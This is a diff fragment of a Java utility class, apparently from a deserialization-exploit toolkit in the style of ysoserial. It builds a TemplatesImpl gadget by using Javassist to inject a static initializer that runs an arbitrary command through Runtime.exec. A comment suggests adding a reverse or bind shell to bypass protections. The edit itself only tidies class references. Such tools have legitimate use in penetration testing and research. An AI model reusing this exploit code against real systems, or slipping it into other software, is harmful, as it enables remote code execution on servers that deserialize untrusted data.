@@ -88,9 +88,9 @@ public class Utils {
 
         // use template gadget class
         ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(Utils.StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
         pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(Utils.StubTransletPayload.class.getName());
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
         String cmd = "System.out.println(\"whoops!\"); java.lang.Runtime.getRuntime().exec(\"" +
@@ -106,7 +106,7 @@ public class Utils {
 
         // inject class bytes into instance
         Utils.setFieldValue(templates, "_bytecodes", new byte[][] {
-                classBytes, Utils.classAsBytes(Utils.Foo.class)
+                classBytes, Utils.classAsBytes(Foo.class)
         });
 
         // required to make TemplatesImpl happy
